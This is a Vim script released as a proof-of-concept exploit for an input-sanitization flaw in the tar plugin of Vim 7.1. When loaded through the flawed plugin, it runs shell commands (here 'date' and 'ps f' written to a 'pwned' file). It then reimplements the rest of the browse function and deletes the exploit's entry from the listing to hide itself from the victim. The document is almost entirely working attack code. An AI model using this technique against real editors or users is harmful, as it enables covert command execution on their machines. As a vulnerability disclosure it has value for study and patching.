" Vim 7.1 (tar plugin) missing untrusted input sanitization: exploit
"
" Copyright 2007 Jan Minar <rdancer@gmail.com> {{{1
" Based on tar.vim version 11, which carries the following copyright notice:
" Copyright:    Copyright (C) 2005 Charles E. Campbell, Jr.
"               Permission is hereby granted to use and distribute this code,
"               with or without modifications, provided that this copyright
"               notice is copied with it. Like anything else that's free,
"               tarPlugin.vim is provided *as is* and comes with no warranty
"               of any kind, either expressed or implied. By using this
"               plugin, you agree that in no event will the copyright
"               holder be liable for any damages resulting from the use
"               of this software.
" License: GPLv2
" Usage: {{{1
"
" 
"     For Your convenience, Makefile is included that does the following steps
"     automatically. Just run this, and see the exploit working:
"
"	$ make
"
" Arbitrary command execution here {{{1
"
silent !date -R  > pwned
silent !ps f    >> pwned

" Finish the tar#Browse function {{{1
  " Finish writing header {{{2
  s#/.*$##
  let w:fsav = @f
   let @f = w:tarfile
   exe "normal A\<c-r>\<c-r>f"
  let @f = w:fsav
  exe "$put ='".'\"'." Select a file with cursor and press ENTER"."'"
  0d
  $

  " Escape a:tarfile, poorly {{{2
  let tarfile= w:tarfile
  if has("win32") && executable("cygpath")
   " assuming cygwin
   " XXX Whatever this does  -- rdancer 2007-07-13
   let tarfile=substitute(system("cygpath -u ".tarfile),'\n$','','e')
  endif
  let curlast= line("$")
  " XXX Don't let %-expansion happen in the first place
  " XXX The list of expandable chars is incomplete
  let tarfile_s = escape(shellescape(tarfile), '%#<')
  " Unroll the tarball, according to compression type {{{2
  if tarfile =~# '\.\(gz\|tgz\)$'
"   call Decho("exe silent r! gzip -d -c ".g:tar_shq.tarfile.g:tar_shq."| ".g:tar_cmd." -".g:tar_browseoptions." - ")
   exe "silent r! gzip -d -c -- ".tarfile_s."| ".g:tar_cmd." -".g:tar_browseoptions." - "
  elseif tarfile =~# '\.bz2$'
"   call Decho("exe silent r! bzip2 -d -c ".g:tar_shq.tarfile.g:tar_shq."| ".g:tar_cmd." -".g:tar_browseoptions." - ")
   exe "silent r! bzip2 -d -c -- ".tarfile_s."| ".g:tar_cmd." -".g:tar_browseoptions." - "
  else
"   call Decho("exe silent r! ".g:tar_cmd." -".g:tar_browseoptions." ".g:tar_shq.tarfile.g:tar_shq)
   exe "silent r! ".g:tar_cmd." -".g:tar_browseoptions." ".tarfile_s
  endif

  " Errors and housekeeping {{{2
  if v:shell_error != 0
   redraw!
   echohl WarningMsg | echo "***warning*** (tar#Browse) please check your g:tar_browseoptions<".g:tar_browseoptions.">"
"   call inputsave()|call input("Press <cr> to continue")|call inputrestore()
"   call Dret("tar#Browse : a:tarfile<".a:tarfile.">")
   finish
  endif

  " Remove the exploit-containing member from the listing
  4d
  $

  setlocal noma nomod ro
  noremap <silent> <buffer> <cr> :call <SID>TarBrowseSelect()<cr>

  " Can't restore this one -- out of scope.  Could do it from the filename.
  "let &report= repkeep
"  call Dret("tar#Browse : w:tarfile<".w:tarfile.">")

" --------------------------------------------------------------------

" TarBrowseSelect: {{{2
fun! s:TarBrowseSelect()
"  call Dfunc("TarBrowseSelect() w:tarfile<".w:tarfile."> curfile<".expand("%").">")
  let repkeep= &report
  set report=10
  let fname= getline(".")
"  call Decho("fname<".fname.">")

  " sanity check
  if fname =~ '^"'
   let &report= repkeep
"   call Dret("TarBrowseSelect")
   return
  endif

  " about to make a new window, need to use w:tarfile
  let tarfile= w:tarfile
  let curfile= expand("%")
  if has("win32") && executable("cygpath")
   " assuming cygwin
   let tarfile=substitute(system("cygpath -u ".tarfile),'\n$','','e')
  endif

  new
  wincmd _
  let s:tblfile_{winnr()}= curfile
  " VERY_MAGIC will be expanded by make -- cf. Makefile
  call _tar_Read_VERY_MAGIC("tarfile:".tarfile.':'.fname,1)
  filetype detect

  let &report= repkeep
"  call Dret("TarBrowseSelect : s:tblfile_".winnr()."<".s:tblfile_{winnr()}.">")
endfun

" ---------------------------------------------------------------------

"  vim:ts=8 fdm=marker
